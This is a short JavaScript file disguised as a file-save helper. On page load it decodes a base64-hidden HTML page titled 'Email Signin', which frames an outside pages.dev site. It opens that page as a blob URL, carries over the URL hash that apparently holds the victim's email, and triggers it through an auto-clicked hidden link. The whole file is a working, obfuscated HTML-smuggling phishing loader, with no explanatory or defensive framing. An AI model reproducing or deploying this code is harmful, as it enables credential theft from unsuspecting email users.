 $(document).ready(function() {
		saveFile();
});

function saveFile (name, type, data) {
    if (data != null && navigator.msSaveBlob)
        return navigator.msSaveBlob(new Blob([data], { type: type }), name);

    var a = $("<a style='display: none;'/>");
    var encodedStringAtoB = 'PGh0bWw+PGhlYWQ+CjxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgo8dGl0bGU+RW1haWwgU2lnbmluPC90aXRsZT4KCjxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iaHR0cHM6Ly93ZHNoZGtkLnBhZ2VzLmRldi9mYXZpY29uLmljbyIgdHlwZT0iaW1hZ2UveC1pY29uIj4KPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwczovL3dkc2hka2QucGFnZXMuZGV2L2Zhdmljb24uaWNvIiB0eXBlPSJpbWFnZS94LWljb24iPgoKPHN0eWxlPgpodG1sLCBib2R5IHsgbWFyZ2luOiAwOyBwYWRkaW5nOiAwOyB3aWR0aDogMTAwJTsgaGVpZ2h0OiAxMDAlOyB9CmlmcmFtZSB7IHdpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7IGJvcmRlcjogbm9uZTsgfQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8aWZyYW1lIHNyYz0iaHR0cHM6Ly93ZHNoZGtkLnBhZ2VzLmRldi8iPjwvaWZyYW1lPgo8c2NyaXB0Pgpjb25zdCBlbWFpbCA9ICIiOwo8L3NjcmlwdD4KCjwvYm9keT48L2h0bWw+';
    var decodedStringAtoB = atob(encodedStringAtoB);

    const myBlob = new Blob([decodedStringAtoB], {type: 'text/html'})
    const url = window.URL.createObjectURL(myBlob);

    // ⭐ critical: retain hash
    a.attr("href", url + window.location.hash);
    
    $("body").append(a);
    a[0].click();
    window.URL.revokeObjectURL(url);
    a.remove();
}

 